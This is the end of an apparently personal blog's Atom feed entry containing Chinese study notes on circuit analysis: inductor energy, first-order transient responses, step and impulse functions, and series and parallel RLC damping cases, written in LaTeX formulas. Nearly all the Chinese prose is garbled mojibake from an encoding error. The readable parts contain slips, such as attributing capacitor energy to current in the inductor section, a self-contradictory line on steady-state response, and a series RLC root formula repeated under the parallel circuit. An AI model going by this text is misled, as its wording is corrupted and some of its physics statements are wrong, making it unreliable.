title="ÂÇ®ËÉΩ"></a>ÂÇ®ËÉΩ</h3><p>$$<br>p(t)&#x3D;i(t)L\frac{di}{dt}<br>$$</p><p>$$<br>w(t_0,t)&#x3D;\frac{1}{2}L[i^2(t)-i^2(t_0)]<br>$$</p><p>ÊüêÊó∂ÂàªÁîµÂÆπÂÇ®ËÉΩÂè™ÂèñÂÜ≥‰∫é<strong>ÁîµÊµÅ</strong>Ôºå‰∏éÁîµÊÑüÊó†ÂÖ≥</p><h3 id="‰∏≤Âπ∂ËÅî-1"><a href="#‰∏≤Âπ∂ËÅî-1" class="headerlink" title="‰∏≤Âπ∂ËÅî"></a>‰∏≤Âπ∂ËÅî</h3><p>Âπ∂ËÅîÂèòÂ∞èÔºå‰∏≤ËÅîÂèòÂ§ß</p><h1 id="‰∏ÄÈò∂ÁîµË∑ØÁöÑÊöÇÊÄÅËøáÁ®ã"><a href="#‰∏ÄÈò∂ÁîµË∑ØÁöÑÊöÇÊÄÅËøáÁ®ã" class="headerlink" title="‰∏ÄÈò∂ÁîµË∑ØÁöÑÊöÇÊÄÅËøáÁ®ã"></a>‰∏ÄÈò∂ÁîµË∑ØÁöÑÊöÇÊÄÅËøáÁ®ã</h1><h2 id="ÂÖ®ÂìçÂ∫î-‰∏âË¶ÅÁ¥†Ê≥ïÔºà‰ªÖÈôêÁõ¥ÊµÅÊøÄÂä±‰∏ÄÈò∂Ôºâ"><a href="#ÂÖ®ÂìçÂ∫î-‰∏âË¶ÅÁ¥†Ê≥ïÔºà‰ªÖÈôêÁõ¥ÊµÅÊøÄÂä±‰∏ÄÈò∂Ôºâ" class="headerlink" title="ÂÖ®ÂìçÂ∫î-‰∏âË¶ÅÁ¥†Ê≥ïÔºà‰ªÖÈôêÁõ¥ÊµÅÊøÄÂä±‰∏ÄÈò∂Ôºâ"></a>ÂÖ®ÂìçÂ∫î-‰∏âË¶ÅÁ¥†Ê≥ïÔºà‰ªÖÈôêÁõ¥ÊµÅÊøÄÂä±‰∏ÄÈò∂Ôºâ</h2><p>$$<br>f(t)&#x3D;[f(0_+)-f(\infty)]e^{-\frac{t}{\tau}}+f(\infty)\space (t\geq0)<br>$$</p><blockquote><p>ÂÖ®ÂìçÂ∫î &#x3D; Âõ∫ÊúâÂìçÂ∫îÔºàÁû¨ÊÄÅÂìçÂ∫îÔºâ + Âº∫Âà∂ÂìçÂ∫îÔºàÁ®≥ÊÄÅÂìçÂ∫îÔºâ</p><p>Ê≥®ÊÑèÔºö<strong>ÈùûÁõ¥ÊµÅÊøÄÂä±</strong>‰∏ãÔºåÂõ∫ÊúâÂìçÂ∫î<strong>‰∏çÁ≠â‰∫é</strong>Áû¨ÊÄÅÂìçÂ∫îÔºåÁ®≥ÊÄÅÂìçÂ∫î<strong>‰∏çÁ≠â‰∫é</strong>Á®≥ÊÄÅÂìçÂ∫î</p><p>Áû¨ÊÄÅÂìçÂ∫îÔºöÈöètÂèòÂåñÂõ∫ÊúâÂìçÂ∫îÔºöÁî±ÂÜÖÈÉ®ÁîµË∑ØÂéüÊú¨Áä∂ÊÄÅÂºïËµ∑ÁöÑÂèòÂåñ</p></blockquote><p>$$<br>f(t)&#x3D;f(0_+)e^{-\frac{t}{\tau}}+f(\infty)(1-e^{-\frac{t}{\tau}})\space(t\geq 0)<br>$$</p><blockquote><p>ÂÖ®ÂìçÂ∫î &#x3D; Èõ∂ËæìÂÖ•ÂìçÂ∫î + Èõ∂Áä∂ÊÄÅÂìçÂ∫î</p></blockquote><p>$$<br>\tau&#x3D;R_0C\space or\space\tau&#x3D;\frac{L}{R_0}<br>$$</p><p>$\tau$ ÂÖ∑ÊúâÊó∂Èó¥‰ΩÜÈáèÁ∫≤ÔºåÁß∞‰∏∫RCÁîµË∑ØÁöÑ<strong>Êó∂Èó¥Â∏∏Êï∞</strong></p><p>‰∏ÄËà¨Áî®$3\tau$ Ê≥ïÂà§Êñ≠ÊîæÁîµËøáÁ®ãÁªìÊùüÔºåÂç≥90%</p><p>ËÆ°ÁÆóRÊó∂ÔºåÁîµÂÆπÁî®<strong>Êà¥Áª¥ÂÆÅÁ≠âÊïà</strong>ÔºåÁîµÊÑüÁî®<strong>ËØ∫È°øÁ≠âÊïà</strong></p><h3 id="warning-Ê≥®ÊÑè"><a href="#warning-Ê≥®ÊÑè" class="headerlink" title=":warning:Ê≥®ÊÑè"></a>:warning:Ê≥®ÊÑè</h3><p>ÁîµÂÆπÁîµË∑ØÈáåÔºåÁîµÊµÅ<strong>ÂèØ‰ª•Ë∑ÉÂèò</strong>ÔºõÁîµÊÑüÁîµË∑ØÈáåÔºåÁîµÂéã<strong>ÂèØ‰ª•Ë∑ÉÂèò</strong></p><p>Ê≥®ÊÑèË°®ËææÂºèËåÉÂõ¥ÊòØÂê¶ÂåÖÂê´0</p><h2 id="ÂåÖÂê´ÂºÄÂÖ≥Â∫èÂàóÁöÑÁõ¥ÊµÅ‰∏ÄÈò∂ÁîµË∑Ø"><a href="#ÂåÖÂê´ÂºÄÂÖ≥Â∫èÂàóÁöÑÁõ¥ÊµÅ‰∏ÄÈò∂ÁîµË∑Ø" class="headerlink" title="ÂåÖÂê´ÂºÄÂÖ≥Â∫èÂàóÁöÑÁõ¥ÊµÅ‰∏ÄÈò∂ÁîµË∑Ø"></a>ÂåÖÂê´ÂºÄÂÖ≥Â∫èÂàóÁöÑÁõ¥ÊµÅ‰∏ÄÈò∂ÁîµË∑Ø</h2><h3 id="Èò∂Ë∑ÉÂáΩÊï∞"><a href="#Èò∂Ë∑ÉÂáΩÊï∞" class="headerlink" title="Èò∂Ë∑ÉÂáΩÊï∞"></a>Èò∂Ë∑ÉÂáΩÊï∞</h3><p>$$<br>\varepsilon(t)&#x3D;\begin{cases}<br>0 &amp; t&lt;0\\<br>1 &amp; t&gt;0<br>\end{cases}<br>$$</p><p>ÂºïÂÖ•Èò∂Ë∑ÉÁîµÊµÅÊ∫êÂíåÈò∂Ë∑ÉÁîµÂéãÊ∫êÂèØ‰ª•ÁúÅÂéªÁîµË∑Ø‰∏≠ÁöÑÂºÄÂÖ≥ÔºåÂèØ‰ª•Â∫îÁî®Âè†Âä†ÂÆöÁêÜËÆ°ÁÆóÁîµË∑ØÁöÑÈõ∂Áä∂ÊÄÅÂìçÂ∫î</p><h3 id="Èò∂Ë∑ÉÂìçÂ∫î"><a href="#Èò∂Ë∑ÉÂìçÂ∫î" class="headerlink" title="Èò∂Ë∑ÉÂìçÂ∫î"></a>Èò∂Ë∑ÉÂìçÂ∫î</h3><p>Âçï‰ΩçÈò∂Ë∑É‰ø°Âè∑‰ΩúÁî®‰∏ãÁîµË∑ØÁöÑ<strong>Èõ∂Áä∂ÊÄÅÂìçÂ∫î</strong>ÔºåÁî®$s(t)$Ë°®Á§∫</p><p>Â∑≤Áü•ÁîµË∑ØÁöÑÈò∂Ë∑ÉÂìçÂ∫îÔºåÂà©Áî®<strong>Âè†Âä†ÂÆöÁêÜ</strong>ÊòìÂæó‰ªªÊÑèÂàÜÊÆµÊÅíÂÆö‰ø°Âè∑ÊøÄÂä±‰∏ãÁ∫øÊÄßÊó∂‰∏çÂèòÁîµË∑ØÁöÑÈõ∂Áä∂ÊÄÅÂìçÂ∫î</p><h3 id="ÂÜ≤ÊøÄÂáΩÊï∞"><a href="#ÂÜ≤ÊøÄÂáΩÊï∞" class="headerlink" title="ÂÜ≤ÊøÄÂáΩÊï∞"></a>ÂÜ≤ÊøÄÂáΩÊï∞</h3><p>‰∏Ä‰∏™Êó†Áïå‰ø°Âè∑$\delta(t)$‰∏∫<strong>Âçï‰ΩçÂÜ≤ÊøÄÂáΩÊï∞</strong>ÂΩì‰∏î‰ªÖÂΩì<br>$$<br>\begin{cases}<br>\delta(t)&#x3D;\begin{cases}<br>        Â•áÂºÇÂÄº&amp;t&#x3D;0\\<br>        0&amp;t\neq 0<br>    \end{cases}\\<br>    \int_{-\varepsilon_2}^{\varepsilon_1}\delta(t)dt&#x3D;1&amp;\varepsilon_1&gt;0,\varepsilon_2&gt;0<br>\end{cases}<br>$$<br>Âçï‰ΩçÈò∂Ë∑ÉÂáΩÊï∞‰∏éÂçï‰ΩçÂÜ≤ÊøÄÂáΩÊï∞Èó¥Â≠òÂú®ÂÖ≥Á≥ª<br>$$<br>\delta(t)&#x3D;\frac{d\varepsilon(t)}{dt}<br>$$</p><p>$$<br>\varepsilon(t)&#x3D;\int^t_{-\infty}\delta(\xi)d\xi<br>$$</p><h3 id="ÂÜ≤ÊøÄÂìçÂ∫î"><a href="#ÂÜ≤ÊøÄÂìçÂ∫î" class="headerlink" title="ÂÜ≤ÊøÄÂìçÂ∫î"></a>ÂÜ≤ÊøÄÂìçÂ∫î</h3><p>Âçï‰ΩçÂÜ≤ÊøÄ‰ø°Âè∑‰ΩúÁî®‰∏ãÁîµË∑ØÁöÑ<strong>Èõ∂Áä∂ÊÄÅÂìçÂ∫î</strong>ÔºåË°®Á§∫‰∏∫$h(t)$</p><p>ÂèØÂÖàÊ±ÇÂá∫$s(t)$ÔºåÂØπÊó∂Èó¥Ê±ÇÂØº</p><h1 id="‰∫åÈò∂ÁîµË∑ØÁöÑÊöÇÊÄÅËøáÁ®ã"><a href="#‰∫åÈò∂ÁîµË∑ØÁöÑÊöÇÊÄÅËøáÁ®ã" class="headerlink" title="‰∫åÈò∂ÁîµË∑ØÁöÑÊöÇÊÄÅËøáÁ®ã"></a>‰∫åÈò∂ÁîµË∑ØÁöÑÊöÇÊÄÅËøáÁ®ã</h1><blockquote><p>‰ªÖËÆ®ËÆ∫Âê´‰∏§‰∏™Âä®ÊÄÅÂéü‰ª∂ÁöÑÁ∫øÊÄß‰∫åÈò∂ÁîµË∑Ø</p></blockquote><h2 id="RLC‰∏≤ËÅîÁîµË∑ØÁöÑÈõ∂ËæìÂÖ•ÂìçÂ∫î"><a href="#RLC‰∏≤ËÅîÁîµË∑ØÁöÑÈõ∂ËæìÂÖ•ÂìçÂ∫î" class="headerlink" title="RLC‰∏≤ËÅîÁîµË∑ØÁöÑÈõ∂ËæìÂÖ•ÂìçÂ∫î"></a>RLC‰∏≤ËÅîÁîµË∑ØÁöÑÈõ∂ËæìÂÖ•ÂìçÂ∫î</h2><p>Â∏∏Á≥ªÊï∞ÈùûÈΩêÊ¨°Á∫øÊÄß‰∫åÈò∂ÂæÆÂàÜÊñπÁ®ã:<br>$$<br>LC\frac{d^2u_c}{dt^2}+RC\frac{du_c}{dt}+u_c&#x3D;u_s(t)<br>$$<br>ÁîµË∑ØÂæÆÂàÜÊñπÁ®ãÁöÑÁâπÂæÅÊ†πÔºàÁîµË∑ØÁöÑ<strong>Âõ∫ÊúâÈ¢ëÁéá</strong>Ôºâ:<br>$$<br>s_{1,2}&#x3D;-\frac{R}{2L}\pm\sqrt{(\frac{R}{2L})^2-\frac{1}{LC}}<br>$$</p><ol><li>$R&gt;2\sqrt{\frac{L}{C}}$ Ôºå$s_{1,2}$‰∏∫‰∏çÁõ∏Á≠âÂÆûÊ†πÔºå<strong>ËøáÈòªÂ∞ºÊÉÖÂÜµ</strong></li><li>$R&#x3D;2\sqrt{\frac{L}{C}}$ Ôºå$s_{1,2}$‰∏∫Áõ∏Á≠âÂÆûÊ†πÔºå<strong>‰∏¥ÁïåÈòªÂ∞ºÊÉÖÂÜµ</strong></li><li>$R&lt;2\sqrt{\frac{L}{C}}$ Ôºå$s_{1,2}$ÂÖ±ËΩ≠Â§çÊï∞Ê†πÔºå<strong>Ê¨†ÈòªÂ∞ºÊÉÖÂÜµ</strong></li></ol><blockquote><p>ÂØπRÊù•ËØ¥ÔºåË∂äÂ§ßË∂ä‰∏çÊòìÈúáËç°ÔºåRË∂ãËøë$\infty$Êó∂ÂºÄË∑ØÔºõË∂äÂ∞èË∂äÊòìÈúáËç°ÔºåR‰∏∫0Êó∂‰∏∫LCÈúáËç°ÁîµË∑Ø</p><p>LË∂äÂ§ßÔºàLÂÇ®ËÉΩË∂äÂ§ßÔºå$\frac{1}{2}L\Delta i^2$Â§ßÔºåÁîµÊµÅÂèòÂåñÂ§ßÔºâCË∂äÂ∞èÔºà$q&#x3D;CU$ÁîµÂéãÂèòÂåñË∂äÂ§ßÔºâÔºåË∂äÂÆπÊòìÈúáËç°</p></blockquote><h3 id="ËøáÈòªÂ∞º"><a href="#ËøáÈòªÂ∞º" class="headerlink" title="ËøáÈòªÂ∞º"></a>ËøáÈòªÂ∞º</h3><p><img src="/../img/%E5%8A%A8%E6%80%81%E7%94%B5%E8%B7%AF%E5%8F%8A%E7%9E%AC%E6%80%81%E5%88%86%E6%9E%90.assets/image-20230521192230226.png" alt="image-20230521192230226"></p><h3 id="‰∏¥ÁïåÈòªÂ∞º"><a href="#‰∏¥ÁïåÈòªÂ∞º" class="headerlink" title="‰∏¥ÁïåÈòªÂ∞º"></a>‰∏¥ÁïåÈòªÂ∞º</h3><p><img src="/../img/%E5%8A%A8%E6%80%81%E7%94%B5%E8%B7%AF%E5%8F%8A%E7%9E%AC%E6%80%81%E5%88%86%E6%9E%90.assets/image-20230521192259513.png" alt="image-20230521192259513"></p><h3 id="Ê¨†ÈòªÂ∞º"><a href="#Ê¨†ÈòªÂ∞º" class="headerlink" title="Ê¨†ÈòªÂ∞º"></a>Ê¨†ÈòªÂ∞º</h3><p>$$<br>s_{1,2}&#x3D;-\frac{R}{2L}\pm\sqrt{(\frac{R}{2L})^2-\frac{1}{LC}}&#x3D;-\alpha\pm j\sqrt{w_0^2-\alpha^2}&#x3D;-\alpha\pm jw_d<br>$$</p><p>Ë°∞ÂáèÂõ†Â≠ê$\alpha&#x3D;\frac{R}{2L}$ÔºåÂõ†‰∏∫RCL‰∏≤ËÅîÁîµË∑ØÈúáËç°Âø´ÊÖ¢Áî±iÂÜ≥ÂÆöÔºåÊïÖÁî®ÁîµÊÑüÊó∂Èó¥Â∏∏Êï∞ÔºåÁ≠â‰∫é$\frac{1}{2\tau}$</p><p>Êó†ÈòªÂ∞ºËá™ÁÑ∂ÔºàË∞êÊåØÔºâÈ¢ëÁéá$w_0&#x3D;\frac{1}{\sqrt{LC}}$</p><p>ÊúâÈòªÂ∞ºËá™ÁÑ∂È¢ëÁéá$w_d&#x3D;\sqrt{w_0^2-\alpha^2}$</p><p><img src="/../img/%E5%8A%A8%E6%80%81%E7%94%B5%E8%B7%AF%E5%8F%8A%E7%9E%AC%E6%80%81%E5%88%86%E6%9E%90.assets/image-20230521192307785.png" alt="image-20230521192307785"></p><p>Ê¨†ÈòªÂ∞ºËÉΩÈáèÂú®<strong>ÁîµÂÆπ‰∏éÁîµÊÑü</strong>‰πãÈó¥‰∫§Êç¢</p><p><img src="/../img/%E5%8A%A8%E6%80%81%E7%94%B5%E8%B7%AF%E5%8F%8A%E7%9E%AC%E6%80%81%E5%88%86%E6%9E%90.assets/image-20230521192313567.png" alt="image-20230521192313567"></p><h3 id="Áõ¥ÊµÅÊøÄÂä±‰∏ãRLC‰∏≤ËÅîÁîµË∑ØÁöÑÂìçÂ∫î"><a href="#Áõ¥ÊµÅÊøÄÂä±‰∏ãRLC‰∏≤ËÅîÁîµË∑ØÁöÑÂìçÂ∫î" class="headerlink" title="Áõ¥ÊµÅÊøÄÂä±‰∏ãRLC‰∏≤ËÅîÁîµË∑ØÁöÑÂìçÂ∫î"></a>Áõ¥ÊµÅÊøÄÂä±‰∏ãRLC‰∏≤ËÅîÁîµË∑ØÁöÑÂìçÂ∫î</h3><p>ÂÖ®ÂìçÂ∫îÁî±ÂØπÂ∫îÈΩêÊ¨°ÂæÆÂàÜÊñπÁ®ãÈÄöËß£‰∏éÂæÆÂàÜÊñπÁ®ãÁâπËß£‰πãÂíåÁªÑÊàê<br>$$<br>u_c(t)&#x3D;u_{Ch}(t)+u_{Cp}(t)<br>$$<br> $s_1\neq s_2$Êó∂<br>$$<br>u_c(t)&#x3D;K_1e^{s_1t}+K_2e^{s_2t}+U_S<br>$$<br>Âà©Áî®<br>$$<br>u_c(0),\frac{du_c(t)}{dt}\Bigg |_{t&#x3D;0}&#x3D;\frac{i_L(0)}{C}<br>$$<br>Ê±ÇËß£$K_1K_2$</p><h2 id="RLCÂπ∂ËÅîÁîµË∑ØÁöÑÈõ∂ËæìÂÖ•ÂìçÂ∫î"><a href="#RLCÂπ∂ËÅîÁîµË∑ØÁöÑÈõ∂ËæìÂÖ•ÂìçÂ∫î" class="headerlink" title="RLCÂπ∂ËÅîÁîµË∑ØÁöÑÈõ∂ËæìÂÖ•ÂìçÂ∫î"></a>RLCÂπ∂ËÅîÁîµË∑ØÁöÑÈõ∂ËæìÂÖ•ÂìçÂ∫î</h2><p>$$<br>LC\frac{d^2i_L}{dt^2}+GL\frac{di_L}{dt}+i_L&#x3D;i_s(t)<br>$$</p><p>$$<br>s_{1,2}&#x3D;-\frac{R}{2L}\pm\sqrt{(\frac{R}{2L})^2-\frac{1}{LC}}<br>$$</p><p>$$<br>s_{1,2}&#x3D;-\frac{G}{2C}\pm\sqrt{(\frac{G}{2C})^2-\frac{1}{LC}}&#x3D;-\alpha\pm j\sqrt{w_0^2-\alpha^2}&#x3D;-\alpha\pm jw_d<br>$$</p><p>Ë°∞ÂáèÂõ†Â≠ê$\alpha&#x3D;\frac{G}{2C}$ÔºåÂõ†‰∏∫RCLÂπ∂ËÅîÁîµË∑ØÈúáËç°Âø´ÊÖ¢Áî±uÂÜ≥ÂÆöÔºåÊïÖÁî®ÁîµÂÆπÊó∂Èó¥Â∏∏Êï∞ÔºåÁ≠â‰∫é$\frac{1}{2\tau}$</p><p>Êó†ÈòªÂ∞ºËá™ÁÑ∂ÔºàË∞êÊåØÔºâÈ¢ëÁéá$w_0&#x3D;\frac{1}{\sqrt{LC}}$</p><p>ÊúâÈòªÂ∞ºËá™ÁÑ∂È¢ëÁéá$w_d&#x3D;\sqrt{w_0^2-\alpha^2}$</p>]]></content>
    
    
      
      
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;$V_D$Ë°®Â§ßDCÔºå$v_D$Ë°®ÂÖ®‰ø°Âè∑Ôºå$v_d$Ë°®Â∞èAC&lt;/p&gt;
&lt;p&gt;ÁÉ≠ÁîµÂéãÂ∏∏Êï∞$V_T&amp;#x3D;&#92;frac{k}{q}T$Âú®Â∏∏Ê∏©(27Â∫¶)ÈªòËÆ§‰∏∫26mV&lt;/p&gt;
&lt;p&gt;$V_S$ÂüüÂÄºÁîµÂéã	$V_{TH}$‰∏∫BJTÈáçË¶ÅÂèÇÊï∞&lt;/p&gt;
&lt;/blo</summary>
      
    
    
    
    <category term="ESE" scheme="http://deepunk.icu/categories/ESE/"/>
    
    
    <category term="ÁîµË∑ØÂàÜÊûê" scheme="http://deepunk.icu/tags/%E7%94%B5%E8%B7%AF%E5%88%86%E6%9E%90/"/>
    
  </entry>
  
</feed>
